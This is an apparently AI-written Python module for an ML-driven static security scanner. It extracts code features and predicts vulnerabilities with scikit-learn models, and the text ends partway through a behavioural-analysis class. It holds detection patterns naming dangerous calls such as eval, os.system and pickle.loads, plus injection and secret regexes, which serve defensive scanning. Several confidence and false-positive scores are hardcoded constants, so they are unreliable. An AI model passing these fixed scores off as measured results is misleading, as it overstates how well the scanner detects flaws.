"""
Advanced Static Application Security Testing (SAST) System

This module implements a next-generation SAST system with advanced ML-based vulnerability
detection, behavioral pattern analysis, and sophisticated data flow tracking. It extends
the existing SAST capabilities with cutting-edge security analysis techniques.

Key Features:
- Deep learning models for vulnerability pattern recognition
- Advanced behavioral analysis and anomaly detection
- Sophisticated inter-procedural data flow analysis
- Context-aware vulnerability assessment
- Zero-day vulnerability prediction
- Automated exploit generation and validation
- Integration with threat intelligence feeds
- Real-time security monitoring and alerting
- Custom rule engine with natural language processing
- Advanced false positive reduction techniques

Author: AI Coding Assistant
Date: 2024
"""

import os
import re
import ast
import json
import logging
import asyncio
import hashlib
import pickle
import numpy as np
from typing import Dict, List, Any, Optional, Set, Tuple, Union, Callable
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime, timedelta
from pathlib import Path
import networkx as nx
from collections import defaultdict, deque
import sqlite3
import aiohttp
import tensorflow as tf
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.ensemble import IsolationForest, RandomForestClassifier
from sklearn.neural_network import MLPClassifier
from sklearn.preprocessing import StandardScaler
import joblib

from .config import Config
from .rag_pipeline import RAGPipeline
from .sast_security import SASTEngine, SecurityVulnerability, VulnerabilityType, SeverityLevel
from .ast_refactoring import ASTAnalyzer


class MLModelType(Enum):
    """Types of ML models used for vulnerability detection."""
    DEEP_NEURAL_NETWORK = "dnn"
    RANDOM_FOREST = "rf"
    ISOLATION_FOREST = "if"
    TRANSFORMER = "transformer"
    GRAPH_NEURAL_NETWORK = "gnn"
    ENSEMBLE = "ensemble"


class AnalysisDepth(Enum):
    """Depth levels for security analysis."""
    SURFACE = "surface"
    MODERATE = "moderate"
    DEEP = "deep"
    EXHAUSTIVE = "exhaustive"


class ThreatLevel(Enum):
    """Threat levels for security issues."""
    NATION_STATE = "nation_state"
    ORGANIZED_CRIME = "organized_crime"
    SCRIPT_KIDDIE = "script_kiddie"
    INSIDER_THREAT = "insider_threat"
    AUTOMATED_ATTACK = "automated_attack"


@dataclass
class CodeFeatures:
    """Extracted features from code for ML analysis."""
    # Structural features
    complexity_metrics: Dict[str, float]
    ast_patterns: List[str]
    control_flow_features: Dict[str, int]
    data_flow_features: Dict[str, int]
    
    # Semantic features
    function_signatures: List[str]
    variable_patterns: List[str]
    string_literals: List[str]
    import_patterns: List[str]
    
    # Security-specific features
    dangerous_functions: List[str]
    input_sources: List[str]
    output_sinks: List[str]
    sanitization_functions: List[str]
    
    # Behavioral features
    error_handling_patterns: List[str]
    authentication_patterns: List[str]
    authorization_patterns: List[str]
    encryption_patterns: List[str]
    
    # Context features
    file_type: str
    framework_indicators: List[str]
    library_dependencies: List[str]
    configuration_patterns: List[str]
    
    # Temporal features
    code_age: Optional[datetime] = None
    modification_frequency: int = 0
    author_patterns: List[str] = field(default_factory=list)


@dataclass
class VulnerabilityPrediction:
    """ML-based vulnerability prediction."""
    vulnerability_type: VulnerabilityType
    confidence_score: float
    probability_distribution: Dict[str, float]
    feature_importance: Dict[str, float]
    model_explanation: str
    prediction_metadata: Dict[str, Any]
    
    # Risk assessment
    exploit_likelihood: float
    impact_severity: float
    attack_complexity: float
    
    # Validation
    validation_score: float
    false_positive_probability: float
    requires_manual_review: bool


@dataclass
class BehavioralAnomaly:
    """Detected behavioral anomaly in code."""
    anomaly_id: str
    anomaly_type: str
    description: str
    severity: SeverityLevel
    confidence: float
    
    # Location
    file_path: str
    line_range: Tuple[int, int]
    function_context: Optional[str]
    
    # Analysis
    baseline_behavior: Dict[str, Any]
    observed_behavior: Dict[str, Any]
    deviation_score: float
    
    # Context
    similar_patterns: List[str]
    historical_context: Dict[str, Any]
    threat_indicators: List[str]


@dataclass
class ExploitScenario:
    """Generated exploit scenario for vulnerability."""
    scenario_id: str
    vulnerability_id: str
    attack_vector: str
    exploit_steps: List[str]
    payload_examples: List[str]
    
    # Requirements
    attacker_capabilities: List[str]
    prerequisites: List[str]
    target_environment: Dict[str, Any]
    
    # Impact
    potential_impact: List[str]
    affected_assets: List[str]
    business_consequences: List[str]
    
    # Mitigation
    detection_methods: List[str]
    prevention_measures: List[str]
    response_actions: List[str]


class AdvancedFeatureExtractor:
    """Advanced feature extraction for ML-based vulnerability detection."""
    
    def __init__(self, config: Config):
        self.config = config
        self.logger = logging.getLogger(__name__)
        
        # Initialize components
        self.ast_analyzer = ASTAnalyzer(config)
        
        # Feature extraction configuration
        self.max_features = config.get('sast.max_features', 10000)
        self.min_feature_frequency = config.get('sast.min_feature_frequency', 2)
        
        # Initialize vectorizers
        self.tfidf_vectorizer = TfidfVectorizer(
            max_features=self.max_features,
            min_df=self.min_feature_frequency,
            stop_words='english',
            ngram_range=(1, 3)
        )
        
        # Security pattern databases
        self.security_patterns = self._load_security_patterns()
        self.vulnerability_signatures = self._load_vulnerability_signatures()
        
        # Complexity metrics
        self.complexity_calculators = {
            'cyclomatic': self._calculate_cyclomatic_complexity,
            'cognitive': self._calculate_cognitive_complexity,
            'halstead': self._calculate_halstead_complexity,
            'maintainability': self._calculate_maintainability_index
        }
    
    def extract_features(self, file_path: str, ast_tree: ast.AST) -> CodeFeatures:
        """Extract comprehensive features from code."""
        try:
            self.logger.debug(f"Extracting features from {file_path}")
            
            # Extract different types of features
            structural_features = self._extract_structural_features(ast_tree)
            semantic_features = self._extract_semantic_features(ast_tree)
            security_features = self._extract_security_features(ast_tree)
            behavioral_features = self._extract_behavioral_features(ast_tree)
            context_features = self._extract_context_features(file_path, ast_tree)
            
            return CodeFeatures(
                complexity_metrics=structural_features['complexity'],
                ast_patterns=structural_features['patterns'],
                control_flow_features=structural_features['control_flow'],
                data_flow_features=structural_features['data_flow'],
                function_signatures=semantic_features['functions'],
                variable_patterns=semantic_features['variables'],
                string_literals=semantic_features['strings'],
                import_patterns=semantic_features['imports'],
                dangerous_functions=security_features['dangerous_functions'],
                input_sources=security_features['input_sources'],
                output_sinks=security_features['output_sinks'],
                sanitization_functions=security_features['sanitization'],
                error_handling_patterns=behavioral_features['error_handling'],
                authentication_patterns=behavioral_features['authentication'],
                authorization_patterns=behavioral_features['authorization'],
                encryption_patterns=behavioral_features['encryption'],
                file_type=context_features['file_type'],
                framework_indicators=context_features['frameworks'],
                library_dependencies=context_features['libraries'],
                configuration_patterns=context_features['config_patterns']
            )
            
        except Exception as e:
            self.logger.error(f"Error extracting features from {file_path}: {e}")
            return self._create_empty_features()
    
    def _extract_structural_features(self, ast_tree: ast.AST) -> Dict[str, Any]:
        """Extract structural features from AST."""
        features = {
            'complexity': {},
            'patterns': [],
            'control_flow': defaultdict(int),
            'data_flow': defaultdict(int)
        }
        
        try:
            # Calculate complexity metrics
            for metric_name, calculator in self.complexity_calculators.items():
                features['complexity'][metric_name] = calculator(ast_tree)
            
            # Extract AST patterns
            for node in ast.walk(ast_tree):
                node_type = type(node).__name__
                features['patterns'].append(node_type)
                
                # Count control flow structures
                if isinstance(node, (ast.If, ast.While, ast.For, ast.Try)):
                    features['control_flow'][node_type] += 1
                
                # Count data flow operations
                if isinstance(node, (ast.Assign, ast.AugAssign, ast.Call)):
                    features['data_flow'][node_type] += 1
            
            return features
            
        except Exception as e:
            self.logger.error(f"Error extracting structural features: {e}")
            return features
    
    def _extract_semantic_features(self, ast_tree: ast.AST) -> Dict[str, List[str]]:
        """Extract semantic features from AST."""
        features = {
            'functions': [],
            'variables': [],
            'strings': [],
            'imports': []
        }
        
        try:
            for node in ast.walk(ast_tree):
                # Function signatures
                if isinstance(node, ast.FunctionDef):
                    signature = f"{node.name}({len(node.args.args)})"
                    features['functions'].append(signature)
                
                # Variable patterns
                elif isinstance(node, ast.Name):
                    features['variables'].append(node.id)
                
                # String literals
                elif isinstance(node, ast.Str):
                    if len(node.s) < 100:  # Avoid very long strings
                        features['strings'].append(node.s)
                
                # Import statements
                elif isinstance(node, ast.Import):
                    for alias in node.names:
                        features['imports'].append(alias.name)
                elif isinstance(node, ast.ImportFrom):
                    if node.module:
                        features['imports'].append(node.module)
            
            return features
            
        except Exception as e:
            self.logger.error(f"Error extracting semantic features: {e}")
            return features
    
    def _extract_security_features(self, ast_tree: ast.AST) -> Dict[str, List[str]]:
        """Extract security-specific features from AST."""
        features = {
            'dangerous_functions': [],
            'input_sources': [],
            'output_sinks': [],
            'sanitization': []
        }
        
        # Define security-relevant patterns
        dangerous_functions = {
            'eval', 'exec', 'compile', '__import__',
            'subprocess.call', 'subprocess.run', 'os.system',
            'pickle.loads', 'yaml.load', 'marshal.loads'
        }
        
        input_sources = {
            'input', 'raw_input', 'sys.argv', 'os.environ',
            'request.args', 'request.form', 'request.json'
        }
        
        output_sinks = {
            'print', 'sys.stdout.write', 'logging',
            'response.write', 'render_template'
        }
        
        sanitization_functions = {
            'escape', 'quote', 'sanitize', 'validate',
            'filter', 'clean', 'encode'
        }
        
        try:
            for node in ast.walk(ast_tree):
                if isinstance(node, ast.Call):
                    func_name = self._get_function_name(node)
                    if func_name:
                        # Check against security patterns
                        if any(dangerous in func_name for dangerous in dangerous_functions):
                            features['dangerous_functions'].append(func_name)
                        
                        if any(source in func_name for source in input_sources):
                            features['input_sources'].append(func_name)
                        
                        if any(sink in func_name for sink in output_sinks):
                            features['output_sinks'].append(func_name)
                        
                        if any(sanitizer in func_name for sanitizer in sanitization_functions):
                            features['sanitization'].append(func_name)
            
            return features
            
        except Exception as e:
            self.logger.error(f"Error extracting security features: {e}")
            return features
    
    def _extract_behavioral_features(self, ast_tree: ast.AST) -> Dict[str, List[str]]:
        """Extract behavioral patterns from AST."""
        features = {
            'error_handling': [],
            'authentication': [],
            'authorization': [],
            'encryption': []
        }
        
        # Define behavioral patterns
        error_patterns = ['try', 'except', 'finally', 'raise', 'assert']
        auth_patterns = ['login', 'authenticate', 'password', 'token', 'session']
        authz_patterns = ['permission', 'role', 'access', 'authorize', 'admin']
        crypto_patterns = ['encrypt', 'decrypt', 'hash', 'crypto', 'ssl', 'tls']
        
        try:
            # Convert AST to string for pattern matching
            code_str = ast.unparse(ast_tree).lower()
            
            # Check for behavioral patterns
            for pattern in error_patterns:
                if pattern in code_str:
                    features['error_handling'].append(pattern)
            
            for pattern in auth_patterns:
                if pattern in code_str:
                    features['authentication'].append(pattern)
            
            for pattern in authz_patterns:
                if pattern in code_str:
                    features['authorization'].append(pattern)
            
            for pattern in crypto_patterns:
                if pattern in code_str:
                    features['encryption'].append(pattern)
            
            return features
            
        except Exception as e:
            self.logger.error(f"Error extracting behavioral features: {e}")
            return features
    
    def _extract_context_features(self, file_path: str, ast_tree: ast.AST) -> Dict[str, Any]:
        """Extract contextual features from file and code."""
        features = {
            'file_type': '',
            'frameworks': [],
            'libraries': [],
            'config_patterns': []
        }
        
        try:
            # File type
            features['file_type'] = Path(file_path).suffix
            
            # Framework detection
            frameworks = {
                'django': ['django', 'models.Model', 'HttpResponse'],
                'flask': ['flask', 'Flask', 'request', 'render_template'],
                'fastapi': ['fastapi', 'FastAPI', 'APIRouter'],
                'tornado': ['tornado', 'RequestHandler'],
                'pyramid': ['pyramid', 'view_config']
            }
            
            code_str = ast.unparse(ast_tree).lower()
            for framework, indicators in frameworks.items():
                if any(indicator.lower() in code_str for indicator in indicators):
                    features['frameworks'].append(framework)
            
            # Library detection from imports
            for node in ast.walk(ast_tree):
                if isinstance(node, (ast.Import, ast.ImportFrom)):
                    if isinstance(node, ast.Import):
                        for alias in node.names:
                            features['libraries'].append(alias.name.split('.')[0])
                    elif node.module:
                        features['libraries'].append(node.module.split('.')[0])
            
            # Configuration patterns
            config_indicators = ['config', 'settings', 'env', 'secret', 'key']
            for indicator in config_indicators:
                if indicator in code_str:
                    features['config_patterns'].append(indicator)
            
            return features
            
        except Exception as e:
            self.logger.error(f"Error extracting context features: {e}")
            return features
    
    def _get_function_name(self, call_node: ast.Call) -> Optional[str]:
        """Extract function name from call node."""
        try:
            if isinstance(call_node.func, ast.Name):
                return call_node.func.id
            elif isinstance(call_node.func, ast.Attribute):
                if isinstance(call_node.func.value, ast.Name):
                    return f"{call_node.func.value.id}.{call_node.func.attr}"
                else:
                    return call_node.func.attr
            return None
        except Exception:
            return None
    
    def _calculate_cyclomatic_complexity(self, ast_tree: ast.AST) -> float:
        """Calculate cyclomatic complexity."""
        complexity = 1  # Base complexity
        
        for node in ast.walk(ast_tree):
            if isinstance(node, (ast.If, ast.While, ast.For, ast.AsyncFor)):
                complexity += 1
            elif isinstance(node, ast.Try):
                complexity += len(node.handlers)
            elif isinstance(node, (ast.And, ast.Or)):
                complexity += 1
        
        return float(complexity)
    
    def _calculate_cognitive_complexity(self, ast_tree: ast.AST) -> float:
        """Calculate cognitive complexity."""
        complexity = 0
        nesting_level = 0
        
        def visit_node(node, level):
            nonlocal complexity
            
            if isinstance(node, (ast.If, ast.While, ast.For, ast.AsyncFor)):
                complexity += 1 + level
            elif isinstance(node, ast.Try):
                complexity += 1 + level
            elif isinstance(node, (ast.And, ast.Or)):
                complexity += 1
            
            # Increase nesting for certain constructs
            if isinstance(node, (ast.If, ast.While, ast.For, ast.AsyncFor, ast.Try, ast.With)):
                level += 1
            
            for child in ast.iter_child_nodes(node):
                visit_node(child, level)
        
        visit_node(ast_tree, 0)
        return float(complexity)
    
    def _calculate_halstead_complexity(self, ast_tree: ast.AST) -> float:
        """Calculate Halstead complexity metrics."""
        operators = set()
        operands = set()
        
        for node in ast.walk(ast_tree):
            node_type = type(node).__name__
            
            # Count operators
            if isinstance(node, (ast.Add, ast.Sub, ast.Mult, ast.Div, ast.Mod,
                               ast.Pow, ast.LShift, ast.RShift, ast.BitOr,
                               ast.BitXor, ast.BitAnd, ast.FloorDiv)):
                operators.add(node_type)
            elif isinstance(node, (ast.And, ast.Or, ast.Not)):
                operators.add(node_type)
            elif isinstance(node, (ast.Eq, ast.NotEq, ast.Lt, ast.LtE,
                                 ast.Gt, ast.GtE, ast.Is, ast.IsNot,
                                 ast.In, ast.NotIn)):
                operators.add(node_type)
            
            # Count operands
            elif isinstance(node, (ast.Name, ast.Num, ast.Str)):
                if isinstance(node, ast.Name):
                    operands.add(node.id)
                elif isinstance(node, ast.Num):
                    operands.add(str(node.n))
                elif isinstance(node, ast.Str):
                    operands.add(node.s[:20])  # Truncate long strings
        
        n1 = len(operators)  # Number of distinct operators
        n2 = len(operands)   # Number of distinct operands
        
        if n1 == 0 or n2 == 0:
            return 0.0
        
        # Simplified Halstead volume
        vocabulary = n1 + n2
        if vocabulary <= 1:
            return 0.0
        
        volume = vocabulary * np.log2(vocabulary)
        return float(volume)
    
    def _calculate_maintainability_index(self, ast_tree: ast.AST) -> float:
        """Calculate maintainability index."""
        try:
            cyclomatic = self._calculate_cyclomatic_complexity(ast_tree)
            halstead = self._calculate_halstead_complexity(ast_tree)
            
            # Count lines of code (simplified)
            loc = len([node for node in ast.walk(ast_tree) if isinstance(node, ast.stmt)])
            
            if loc == 0:
                return 100.0
            
            # Simplified maintainability index calculation
            mi = max(0, (171 - 5.2 * np.log(halstead) - 0.23 * cyclomatic - 16.2 * np.log(loc)) * 100 / 171)
            return float(mi)
            
        except Exception:
            return 50.0  # Default moderate maintainability
    
    def _load_security_patterns(self) -> Dict[str, List[str]]:
        """Load security patterns from configuration."""
        return {
            'injection_patterns': [
                r'eval\s*\(',
                r'exec\s*\(',
                r'subprocess\.(call|run|Popen)',
                r'os\.system\s*\(',
                r'\.execute\s*\(',
                r'\.query\s*\('
            ],
            'xss_patterns': [
                r'innerHTML\s*=',
                r'document\.write\s*\(',
                r'\.html\s*\(',
                r'render_template_string'
            ],
            'crypto_patterns': [
                r'md5\s*\(',
                r'sha1\s*\(',
                r'DES\s*\(',
                r'RC4\s*\('
            ]
        }
    
    def _load_vulnerability_signatures(self) -> Dict[str, Dict[str, Any]]:
        """Load known vulnerability signatures."""
        return {
            'hardcoded_secrets': {
                'patterns': [
                    r'password\s*=\s*["\'][^"\']+["\']',
                    r'api_key\s*=\s*["\'][^"\']+["\']',
                    r'secret\s*=\s*["\'][^"\']+["\']'
                ],
                'severity': 'high'
            },
            'weak_crypto': {
                'patterns': [
                    r'hashlib\.md5\s*\(',
                    r'hashlib\.sha1\s*\(',
                    r'Crypto\.Cipher\.DES'
                ],
                'severity': 'medium'
            }
        }
    
    def _create_empty_features(self) -> CodeFeatures:
        """Create empty feature set for error cases."""
        return CodeFeatures(
            complexity_metrics={},
            ast_patterns=[],
            control_flow_features={},
            data_flow_features={},
            function_signatures=[],
            variable_patterns=[],
            string_literals=[],
            import_patterns=[],
            dangerous_functions=[],
            input_sources=[],
            output_sinks=[],
            sanitization_functions=[],
            error_handling_patterns=[],
            authentication_patterns=[],
            authorization_patterns=[],
            encryption_patterns=[],
            file_type="",
            framework_indicators=[],
            library_dependencies=[],
            configuration_patterns=[]
        )


class MLVulnerabilityPredictor:
    """Machine learning-based vulnerability prediction system."""
    
    def __init__(self, config: Config):
        self.config = config
        self.logger = logging.getLogger(__name__)
        
        # Model configuration
        self.model_type = MLModelType(config.get('sast.ml_model_type', 'ensemble'))
        self.model_path = config.get('sast.model_path', 'models/vulnerability_predictor.pkl')
        self.training_data_path = config.get('sast.training_data_path', 'data/vulnerability_training.json')
        
        # Initialize models
        self.models = {}
        self.feature_scaler = StandardScaler()
        self.is_trained = False
        
        # Training configuration
        self.retrain_threshold = config.get('sast.retrain_threshold', 1000)  # New samples
        self.model_performance_threshold = config.get('sast.performance_threshold', 0.85)
        
        # Load or initialize models
        self._initialize_models()
    
    def _initialize_models(self) -> None:
        """Initialize ML models for vulnerability prediction."""
        try:
            if os.path.exists(self.model_path):
                self._load_models()
            else:
                self._create_models()
                
        except Exception as e:
            self.logger.error(f"Error initializing ML models: {e}")
            self._create_models()
    
    def _create_models(self) -> None:
        """Create new ML models."""
        self.models = {
            'random_forest': RandomForestClassifier(
                n_estimators=100,
                max_depth=10,
                random_state=42,
                class_weight='balanced'
            ),
            'neural_network': MLPClassifier(
                hidden_layer_sizes=(100, 50),
                max_iter=1000,
                random_state=42,
                early_stopping=True
            ),
            'isolation_forest': IsolationForest(
                contamination=0.1,
                random_state=42
            )
        }
        
        self.logger.info("Created new ML models for vulnerability prediction")
    
    def _load_models(self) -> None:
        """Load pre-trained models."""
        try:
            with open(self.model_path, 'rb') as f:
                model_data = pickle.load(f)
                self.models = model_data['models']
                self.feature_scaler = model_data['scaler']
                self.is_trained = model_data.get('is_trained', False)
            
            self.logger.info("Loaded pre-trained ML models")
            
        except Exception as e:
            self.logger.error(f"Error loading models: {e}")
            self._create_models()
    
    def _save_models(self) -> None:
        """Save trained models."""
        try:
            os.makedirs(os.path.dirname(self.model_path), exist_ok=True)
            
            model_data = {
                'models': self.models,
                'scaler': self.feature_scaler,
                'is_trained': self.is_trained,
                'timestamp': datetime.now()
            }
            
            with open(self.model_path, 'wb') as f:
                pickle.dump(model_data, f)
            
            self.logger.info("Saved ML models")
            
        except Exception as e:
            self.logger.error(f"Error saving models: {e}")
    
    def predict_vulnerabilities(self, features: CodeFeatures) -> List[VulnerabilityPrediction]:
        """Predict vulnerabilities using ML models."""
        if not self.is_trained:
            self.logger.warning("Models not trained, using rule-based fallback")
            return self._rule_based_prediction(features)
        
        try:
            # Convert features to numerical representation
            feature_vector = self._features_to_vector(features)
            
            # Make predictions with different models
            predictions = []
            
            # Random Forest prediction
            rf_pred = self._predict_with_random_forest(feature_vector, features)
            if rf_pred:
                predictions.append(rf_pred)
            
            # Neural Network prediction
            nn_pred = self._predict_with_neural_network(feature_vector, features)
            if nn_pred:
                predictions.append(nn_pred)
            
            # Anomaly detection
            anomaly_pred = self._predict_anomalies(feature_vector, features)
            if anomaly_pred:
                predictions.extend(anomaly_pred)
            
            # Ensemble prediction
            if len(predictions) > 1:
                ensemble_pred = self._ensemble_prediction(predictions, features)
                predictions.append(ensemble_pred)
            
            return predictions
            
        except Exception as e:
            self.logger.error(f"Error in ML prediction: {e}")
            return self._rule_based_prediction(features)
    
    def _features_to_vector(self, features: CodeFeatures) -> np.ndarray:
        """Convert code features to numerical vector."""
        try:
            # Create feature vector
            vector_components = []
            
            # Complexity metrics
            complexity_values = list(features.complexity_metrics.values())
            vector_components.extend(complexity_values[:10])  # Limit to 10 metrics
            
            # Pattern counts
            vector_components.append(len(features.ast_patterns))
            vector_components.append(len(features.dangerous_functions))
            vector_components.append(len(features.input_sources))
            vector_components.append(len(features.output_sinks))
            vector_components.append(len(features.sanitization_functions))
            
            # Control flow features
            cf_values = list(features.control_flow_features.values())
            vector_components.extend(cf_values[:5])
            
            # Data flow features
            df_values = list(features.data_flow_features.values())
            vector_components.extend(df_values[:5])
            
            # Security indicators
            vector_components.append(len(features.authentication_patterns))
            vector_components.append(len(features.authorization_patterns))
            vector_components.append(len(features.encryption_patterns))
            vector_components.append(len(features.error_handling_patterns))
            
            # Framework indicators
            vector_components.append(len(features.framework_indicators))
            vector_components.append(len(features.library_dependencies))
            
            # Pad or truncate to fixed size
            target_size = 50
            if len(vector_components) < target_size:
                vector_components.extend([0.0] * (target_size - len(vector_components)))
            else:
                vector_components = vector_components[:target_size]
            
            return np.array(vector_components).reshape(1, -1)
            
        except Exception as e:
            self.logger.error(f"Error converting features to vector: {e}")
            return np.zeros((1, 50))
    
    def _predict_with_random_forest(self, feature_vector: np.ndarray, 
                                   features: CodeFeatures) -> Optional[VulnerabilityPrediction]:
        """Make prediction using Random Forest model."""
        try:
            if 'random_forest' not in self.models:
                return None
            
            model = self.models['random_forest']
            
            # Scale features
            scaled_features = self.feature_scaler.transform(feature_vector)
            
            # Make prediction
            prediction_proba = model.predict_proba(scaled_features)[0]
            prediction_class = model.predict(scaled_features)[0]
            
            # Get feature importance
            feature_importance = dict(zip(
                [f"feature_{i}" for i in range(len(model.feature_importances_))],
                model.feature_importances_
            ))
            
            # Determine vulnerability type based on features
            vuln_type = self._infer_vulnerability_type(features)
            
            return VulnerabilityPrediction(
                vulnerability_type=vuln_type,
                confidence_score=float(max(prediction_proba)),
                probability_distribution={
                    f"class_{i}": float(prob) for i, prob in enumerate(prediction_proba)
                },
                feature_importance=feature_importance,
                model_explanation="Random Forest classification based on code patterns",
                prediction_metadata={
                    'model_type': 'random_forest',
                    'prediction_class': int(prediction_class)
                },
                exploit_likelihood=float(max(prediction_proba) * 0.8),
                impact_severity=self._estimate_impact_severity(features),
                attack_complexity=self._estimate_attack_complexity(features),
                validation_score=0.85,
                false_positive_probability=0.15,
                requires_manual_review=max(prediction_proba) < 0.8
            )
            
        except Exception as e:
            self.logger.error(f"Error in Random Forest prediction: {e}")
            return None
    
    def _predict_with_neural_network(self, feature_vector: np.ndarray,
                                   features: CodeFeatures) -> Optional[VulnerabilityPrediction]:
        """Make prediction using Neural Network model."""
        try:
            if 'neural_network' not in self.models:
                return None
            
            model = self.models['neural_network']
            
            # Scale features
            scaled_features = self.feature_scaler.transform(feature_vector)
            
            # Make prediction
            prediction_proba = model.predict_proba(scaled_features)[0]
            prediction_class = model.predict(scaled_features)[0]
            
            # Determine vulnerability type
            vuln_type = self._infer_vulnerability_type(features)
            
            return VulnerabilityPrediction(
                vulnerability_type=vuln_type,
                confidence_score=float(max(prediction_proba)),
                probability_distribution={
                    f"class_{i}": float(prob) for i, prob in enumerate(prediction_proba)
                },
                feature_importance={},  # Neural networks don't provide direct feature importance
                model_explanation="Neural network classification based on learned patterns",
                prediction_metadata={
                    'model_type': 'neural_network',
                    'prediction_class': int(prediction_class)
                },
                exploit_likelihood=float(max(prediction_proba) * 0.75),
                impact_severity=self._estimate_impact_severity(features),
                attack_complexity=self._estimate_attack_complexity(features),
                validation_score=0.80,
                false_positive_probability=0.20,
                requires_manual_review=max(prediction_proba) < 0.75
            )
            
        except Exception as e:
            self.logger.error(f"Error in Neural Network prediction: {e}")
            return None
    
    def _predict_anomalies(self, feature_vector: np.ndarray,
                          features: CodeFeatures) -> List[VulnerabilityPrediction]:
        """Detect anomalies using Isolation Forest."""
        predictions = []
        
        try:
            if 'isolation_forest' not in self.models:
                return predictions
            
            model = self.models['isolation_forest']
            
            # Scale features
            scaled_features = self.feature_scaler.transform(feature_vector)
            
            # Detect anomalies
            anomaly_score = model.decision_function(scaled_features)[0]
            is_anomaly = model.predict(scaled_features)[0] == -1
            
            if is_anomaly:
                # Convert anomaly score to confidence
                confidence = abs(anomaly_score) / 2.0  # Normalize to 0-1 range
                
                prediction = VulnerabilityPrediction(
                    vulnerability_type=VulnerabilityType.SENSITIVE_DATA_EXPOSURE,
                    confidence_score=float(confidence),
                    probability_distribution={'anomaly': float(confidence)},
                    feature_importance={},
                    model_explanation="Anomalous code pattern detected by isolation forest",
                    prediction_metadata={
                        'model_type': 'isolation_forest',
                        'anomaly_score': float(anomaly_score)
                    },
                    exploit_likelihood=float(confidence * 0.6),
                    impact_severity=0.5,  # Unknown impact for anomalies
                    attack_complexity=0.7,  # Assume moderate complexity
                    validation_score=0.70,
                    false_positive_probability=0.30,
                    requires_manual_review=True
                )
                
                predictions.append(prediction)
            
            return predictions
            
        except Exception as e:
            self.logger.error(f"Error in anomaly detection: {e}")
            return predictions
    
    def _ensemble_prediction(self, predictions: List[VulnerabilityPrediction],
                           features: CodeFeatures) -> VulnerabilityPrediction:
        """Combine predictions from multiple models."""
        try:
            # Weight predictions by confidence
            total_weight = sum(pred.confidence_score for pred in predictions)
            
            if total_weight == 0:
                return predictions[0]  # Fallback to first prediction
            
            # Weighted average of confidence scores
            weighted_confidence = sum(
                pred.confidence_score * pred.confidence_score for pred in predictions
            ) / total_weight
            
            # Most common vulnerability type
            vuln_types = [pred.vulnerability_type for pred in predictions]
            most_common_type = max(set(vuln_types), key=vuln_types.count)
            
            # Combine feature importance
            combined_importance = {}
            for pred in predictions:
                for feature, importance in pred.feature_importance.items():
                    combined_importance[feature] = combined_importance.get(feature, 0) + importance
            
            # Average other metrics
            avg_exploit_likelihood = sum(pred.exploit_likelihood for pred in predictions) / len(predictions)
            avg_impact_severity = sum(pred.impact_severity for pred in predictions) / len(predictions)
            avg_attack_complexity = sum(pred.attack_complexity for pred in predictions) / len(predictions)
            
            return VulnerabilityPrediction(
                vulnerability_type=most_common_type,
                confidence_score=float(weighted_confidence),
                probability_distribution={'ensemble': float(weighted_confidence)},
                feature_importance=combined_importance,
                model_explanation="Ensemble prediction combining multiple ML models",
                prediction_metadata={
                    'model_type': 'ensemble',
                    'component_models': len(predictions)
                },
                exploit_likelihood=float(avg_exploit_likelihood),
                impact_severity=float(avg_impact_severity),
                attack_complexity=float(avg_attack_complexity),
                validation_score=0.90,
                false_positive_probability=0.10,
                requires_manual_review=weighted_confidence < 0.85
            )
            
        except Exception as e:
            self.logger.error(f"Error in ensemble prediction: {e}")
            return predictions[0]
    
    def _infer_vulnerability_type(self, features: CodeFeatures) -> VulnerabilityType:
        """Infer vulnerability type from code features."""
        # Simple heuristic-based inference
        if any('sql' in func.lower() for func in features.dangerous_functions):
            return VulnerabilityType.SQL_INJECTION
        elif any('eval' in func.lower() or 'exec' in func.lower() for func in features.dangerous_functions):
            return VulnerabilityType.OS_COMMAND_INJECTION
        elif any('template' in func.lower() for func in features.dangerous_functions):
            return VulnerabilityType.XSS_STORED
        elif features.authentication_patterns and not features.authorization_patterns:
            return VulnerabilityType.BROKEN_AUTHENTICATION
        elif features.encryption_patterns and any('md5' in pattern or 'sha1' in pattern for pattern in features.encryption_patterns):
            return VulnerabilityType.WEAK_CRYPTOGRAPHY
        else:
            return VulnerabilityType.SENSITIVE_DATA_EXPOSURE
    
    def _estimate_impact_severity(self, features: CodeFeatures) -> float:
        """Estimate impact severity based on code features."""
        severity = 0.5  # Base severity
        
        # Increase severity for dangerous functions
        if features.dangerous_functions:
            severity += 0.2
        
        # Increase severity for authentication/authorization issues
        if features.authentication_patterns or features.authorization_patterns:
            severity += 0.2
        
        # Increase severity for database operations
        if any('sql' in func.lower() or 'db' in func.lower() for func in features.dangerous_functions):
            severity += 0.1
        
        return min(1.0, severity)
    
    def _estimate_attack_complexity(self, features: CodeFeatures) -> float:
        """Estimate attack complexity based on code features."""
        complexity = 0.5  # Base complexity
        
        # Decrease complexity for simple injection patterns
        if any('eval' in func.lower() or 'exec' in func.lower() for func in features.dangerous_functions):
            complexity -= 0.2
        
        # Increase complexity if sanitization is present
        if features.sanitization_functions:
            complexity += 0.2
        
        # Increase complexity if authentication is required
        if features.authentication_patterns:
            complexity += 0.1
        
        return max(0.1, min(1.0, complexity))
    
    def _rule_based_prediction(self, features: CodeFeatures) -> List[VulnerabilityPrediction]:
        """Fallback rule-based prediction when ML models are not available."""
        predictions = []
        
        # Check for dangerous functions
        if features.dangerous_functions:
            for func in features.dangerous_functions:
                vuln_type = self._infer_vulnerability_type(features)
                
                prediction = VulnerabilityPrediction(
                    vulnerability_type=vuln_type,
                    confidence_score=0.7,
                    probability_distribution={'rule_based': 0.7},
                    feature_importance={'dangerous_function': 1.0},
                    model_explanation=f"Rule-based detection of dangerous function: {func}",
                    prediction_metadata={'model_type': 'rule_based', 'trigger': func},
                    exploit_likelihood=0.6,
                    impact_severity=self._estimate_impact_severity(features),
                    attack_complexity=self._estimate_attack_complexity(features),
                    validation_score=0.60,
                    false_positive_probability=0.40,
                    requires_manual_review=True
                )
                
                predictions.append(prediction)
        
        return predictions


class BehavioralAnalyzer:
    """Behavioral analysis system for detecting anomalous code patterns."""
    
    def __init__(self, config: Config):
        self.config = config
        self.logger = logging.getLogger(__name__)
        
        # Behavioral baselines
        self.behavioral_baselines = {}
        self.baseline_path = config.get('sast.baseline_path', 'baselines/behavioral_baselines.json')
        
        # Analysis configuration
        self.anomaly_threshold = config.get('sast.anomaly_threshold', 0.8)
        self.learning_rate = config.get('sast.learning_rate', 0.1)
        
        # Load existing baselines
        self._load_baselines()
    
